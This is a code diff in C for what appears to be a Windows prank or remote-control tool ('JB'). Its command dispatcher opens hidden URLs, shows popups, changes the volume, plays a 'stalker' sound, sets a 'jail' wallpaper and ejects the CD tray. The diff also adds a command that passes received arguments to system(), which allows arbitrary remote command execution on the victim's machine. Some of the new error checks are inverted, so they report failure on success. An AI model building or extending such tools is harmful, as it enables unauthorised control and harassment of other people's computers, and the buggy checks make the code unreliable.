@@ -46,31 +46,29 @@ void openLink(char *site) {
     
     char *arg1 = strtok(site, SEP);
     char *arg2 = strtok(NULL, SEP);
-    char url[CMD_ARGSZ] = {0};
 
     if(!arg2) {
-        strcat(url, "www."); // i aint typin' www. everytime
-        strcat(url, site);
+        ShellExecuteA(HWND_BROADCAST, "open", site, NULL, NULL, SW_HIDE);
+        return;
     }
-    else if(strcmp(arg2, "1") == 0) {
-        strcat(url, "www.google.com/search?q=");
+
+    if(!strcmp(arg2, "1")) {
+        char url[CMD_ARGSZ] = "www.google.com/search?q=";
         char *tok = strtok(arg1, " ");
 
         // replace spaces in arg1 with '+' (for google search link)
-        while (tok != NULL)
+        while (tok)
         {
             strcat(url, tok); 
             strcat(url, "+"); 
             tok = strtok(NULL, " ");
         }
         url[strlen(url)-1] = '\0'; // remove last + added
-    }
-    else {
-        JBlogErr("Incorrect arguments");
-        return;
-    }
 
-    ShellExecuteA(HWND_BROADCAST, "open", url, NULL, NULL, SW_HIDE);
+        ShellExecuteA(HWND_BROADCAST, "open", url, NULL, NULL, SW_HIDE);
+    }
+    
+    JBlogErr("Incorrect arguments");
 }
 
 void savWal()
@@ -129,7 +127,7 @@ void popupW(char *argz) {
     MultiByteToWideChar(CP_UTF8, 0, _arg2, -1, arg2, two);
 #endif
 
-    if(MessageBoxW(NULL, arg1, arg2 ? arg2 : L"JB", 0))
+    if(!MessageBoxW(NULL, arg1, arg2 ? arg2 : L"JB", 0))
         JBlogErr("Failed to create messagebox");
 }
 
@@ -142,7 +140,7 @@ void popupA(char *argz) {
     char *arg1 = strtok(argz, SEP);
     char *arg2 = strtok(NULL, SEP);
 
-    if(MessageBoxA(NULL, arg1, arg2 ? arg2 : "JB", 0))
+    if(!MessageBoxA(NULL, arg1, arg2 ? arg2 : "JB", 0))
         JBlogErr("Failed to create messagebox");
 }
 
@@ -156,9 +154,7 @@ void execCommand(JBCMD cmd)
 
     {
     char msg[32] = "Executing instruction nr.";
-    char ins[3];
-    itoa(cmd.cmd, ins, 10);
-    strcat(msg, ins);
+	sprintf(msg, "Executing instruction nr.%d", cmd.cmd);
     JBlog(msg);
     }
 
@@ -171,7 +167,7 @@ void execCommand(JBCMD cmd)
         break;
     case JB_FUN:
         CreateLinks(180);
-        SendMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, APPCOMMAND_VOLUME_UP);
+        SendNotifyMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, APPCOMMAND_VOLUME_UP);
         play("stalker");
         changeWallpaper("jail");
         break;
@@ -184,10 +180,13 @@ void execCommand(JBCMD cmd)
 
     /* --- Audio --- */
     case JB_VOLUME:
-        SendMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, APPCOMMAND_VOLUME_UP); // literally raw system mesage
+        if(!SendNotifyMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, APPCOMMAND_VOLUME_UP)) // literally raw system mesage
+            JBlogErr("Could not change Volume");
         break;
     case JB_MUTE:
-        SendMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, APPCOMMAND_VOLUME_DOWN);
+        if(!SendNotifyMessageW(HWND_BROADCAST, WM_APPCOMMAND, 0, APPCOMMAND_VOLUME_DOWN))
+            JBlogErr("Could not change Volume");
+		break;
     case JB_SZAMBO: // it has to be a .wav file
         play(cmd.args);
         break;
@@ -220,16 +219,18 @@ void execCommand(JBCMD cmd)
         openLink(cmd.args);
         break;
     case JB_CDEJECT:
-
-        break;
-    case JB_POPUPA:
-        popupA(cmd.args);
+        if(mciSendStringA("set cdaudio door open",0,0,NULL))
+            JBlogErr("Could not open CD tray");
         break;
     case JB_POPUPW:
         popupW(cmd.args);
         break;
+    case JB_POPUPA:
+        popupA(cmd.args);
+        break;
     case JB_EXEC:
-
+        if(!system(cmd.args))
+            JBlogErr("Could not execute a cmdlet");
         break;
     case JB_ROTATESCR:
 
@@ -242,9 +243,8 @@ void execCommand(JBCMD cmd)
         break;
 
     default:
-        JBlogErr("\\/Unknown command\\/");
         char c[CMD_ARGSZ];
-        itoa(cmd.cmd, c, 10);
+        sprintf(c, "Unknown command: %d", cmd.cmd);
         JBlog(c);
         break;
     }
